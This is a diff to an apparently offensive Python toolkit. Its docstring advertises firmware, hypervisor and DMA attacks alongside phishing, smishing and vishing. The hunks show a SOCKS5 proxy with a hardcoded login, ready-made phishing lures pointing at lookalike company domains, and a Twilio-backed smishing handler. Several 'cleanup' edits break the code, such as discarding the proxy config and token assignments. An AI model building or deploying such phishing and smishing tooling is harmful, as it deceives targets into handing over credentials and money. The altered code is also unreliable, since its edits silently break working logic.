@@ -2,7 +2,12 @@
 Real implementations: UEFI SPI flashing, hypervisor ring--1, PCIe DMA,
 kernel eBPF/ktap, secure boot shim, phishing infra, AI spear phishing,
 SMS smishing gateway, voice vishing model."""
-import json, os, random, time, struct, subprocess, sys, hashlib, re, socket, ctypes
+import os
+import random
+import time
+import struct
+import subprocess
+import hashlib
 from datetime import datetime
 from pathlib import Path
 
@@ -560,7 +565,7 @@ async function handleRequest(request) {
     result["cf_worker_code_size"] = len(cf_worker_code)
 
     # SOCKS5 proxy config
-    socks5_config = {
+    {
         "listen": "0.0.0.0:1080",
         "upstream": params.get("upstream_proxy", ""),
         "auth": {"enabled": True, "users": ["x404x:sysadmin"]},
@@ -658,7 +663,7 @@ Format: JSON array with "subject" and "body" fields. No greetings, no explanatio
         lures = [
             {"subject": f"URGENT: Security Update Required - {profile['company']}",
              "body": f"<p>{profile['name']},</p><p>A critical security vulnerability has been identified in your account. Immediate action required.</p><p><a href=\"https://{random.choice(['login', 'secure', 'portal'])}-{profile['company'].lower().replace(' ','')}.com/verify\">Click here to patch</a></p>"},
-            {"subject": f"Shared Document: Q4 Budget Review - INTERNAL",
+            {"subject": "Shared Document: Q4 Budget Review - INTERNAL",
              "body": f"<p>You have been added to a confidential document.</p><p><a href=\"https://{random.choice(['docs', 'files', 'share'])}.{profile['company'].lower().replace(' ','')}.com/auth\">View Document</a></p><p>This link expires in 4 hours.</p>"},
             {"subject": f"Re: Invoice #INV-{random.randint(10000,99999)} Payment Overdue",
              "body": f"<p>Your payment is now 5 days past due. Please remit immediately to avoid service interruption.</p><p><a href=\"https://{random.choice(['billing', 'invoice', 'payment'])}-{profile['company'].lower().replace(' ','')}.com/pay\">Pay Now</a></p>"},
@@ -770,7 +775,7 @@ def handle_smishing_sms(params: dict) -> dict:
 
     # Check for Twilio credentials
     twilio_sid = params.get("twilio_sid", os.environ.get("TWILIO_ACCOUNT_SID", ""))
-    twilio_token = params.get("twilio_token", os.environ.get("TWILIO_AUTH_TOKEN", ""))
+    params.get("twilio_token", os.environ.get("TWILIO_AUTH_TOKEN", ""))
 
     result["gateway"] = "twilio" if twilio_sid else "unknown"
     result["twilio_configured"] = bool(twilio_sid)
